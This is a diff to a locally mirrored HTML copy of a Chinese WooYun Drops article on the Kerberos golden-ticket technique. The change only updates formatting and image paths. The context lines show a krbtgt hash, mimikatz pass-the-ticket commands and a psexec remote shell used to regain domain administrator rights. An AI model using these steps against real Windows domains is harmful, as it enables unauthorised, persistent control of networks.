@@ -3,24 +3,24 @@
 			<head>
 			     <title>域渗透的金之钥匙 - mickey</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/9591">http://drops.wooyun.org/tips/9591</a></h1>
 				
       <p>
-        <h1>0x00 废话连篇</h1>
+        </p><h1>0x00 废话连篇</h1>
 
-<hr />
+<hr>
 
 <p>最近几年很少搞内网渗透了，这几年发展的快啊，看了A牛翻译的<code>&lt;&lt;Fireeye Mandiant 2014 安全报告 Part1&gt;&gt;</code> ，发现趋势都是powershell脚本化了。想当年遇到的域控都是windows 2003的，找朋友要些vbscript脚本自动化，然后那啥那啥的。现在搞域除了前段时间出的MS14068，还有龙哥翻译的（<a href="http://drops.wooyun.org/papers/576">http://drops.wooyun.org/papers/576</a>）,不知道还有什么新方法，心中还有激情，如果想交流的朋友，可以加我聊聊。</p>
 
 <h1>0x01 金之钥匙</h1>
 
-<hr />
+<hr>
 
 <p>我原来发过一个微薄说</p>
 
-<p><img src="http://static.wooyun.org//drops/20151013/2015101303103866694120.png" alt="" /></p>
+<p><img src="../images_result/images/2015101303103866694120.png" alt=""></p>
 
 <!--more-->
 
@@ -42,7 +42,7 @@
 
 <p>krbtgt(current-disabled):502:aad3b435b51404eeaad3b435b51404ee:<strong>6a8e501fabcf264c70 ef3316c6aab7dc:::</strong></p>
 
-<p><img src="http://static.wooyun.org//drops/20151013/2015101303104160300220.png" alt="" /></p>
+<p><img src="../images_result/images/2015101303104160300220.png" alt=""></p>
 
 <p>然后该用神器mimikatz出场了，依次执行</p>
 
@@ -52,7 +52,7 @@ mimikatz # kerberos::ptt Administrator.kiribi
 mimikatz # kerberos::tgt
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20151013/2015101303104318617314.png" alt="" /></p>
+<p><img src="../images_result/images/2015101303104318617314.png" alt=""></p>
 
 <p>到现在，我们又重新拥有域管理员权限了，可以验证下</p>
 
@@ -60,13 +60,13 @@ mimikatz # kerberos::tgt
 E:\&gt;psexec.exe \\WIN-0DKN2AS0T2G cmd
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20151013/201510130310452401147.png" alt="" /></p>
+<p><img src="../images_result/images/201510130310452401147.png" alt=""></p>
 
 <h1>0x02 后话闲扯</h1>
 
-<hr />
+<hr>
 
-<p>呃，感觉这个方法比<a href="http://drops.wooyun.org/tips/9297">http://drops.wooyun.org/tips/9297</a>这个方便些，文章写了好久了，一直凑不出更多的字数，就没发。。嗯。。。懒了。。</p>      </p>
+<p>呃，感觉这个方法比<a href="http://drops.wooyun.org/tips/9297">http://drops.wooyun.org/tips/9297</a>这个方便些，文章写了好久了，一直凑不出更多的字数，就没发。。嗯。。。懒了。。</p>      <p></p>
     
 			</body>
 		</html>
